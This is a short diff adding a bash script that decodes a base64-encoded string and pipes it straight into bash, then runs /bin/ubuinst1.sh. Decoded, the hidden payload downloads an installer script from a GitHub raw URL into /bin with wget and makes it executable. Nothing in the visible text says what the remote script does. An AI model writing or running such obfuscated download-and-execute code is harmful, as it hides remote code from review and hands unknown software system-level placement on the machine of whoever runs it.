@@ -1,0 +1,3 @@
+#!/bin/bash
+echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RpZ3VsZ2Fzb2Z0L1BXRUItMjAyMy9tYWluL2luc3RhbGwvdWJ1aW5zdDIuc2ggJiYgY2htb2QgK3ggdWJ1aW5zdDIuc2ggJiYgZG9zMnVuaXggdWJ1aW5zdDIuc2ggPiAvZGV2L251bGwgMj4mMQpjZCB8fCBleGl0Cgo=' | base64 -d | bash
+/bin/ubuinst1.sh
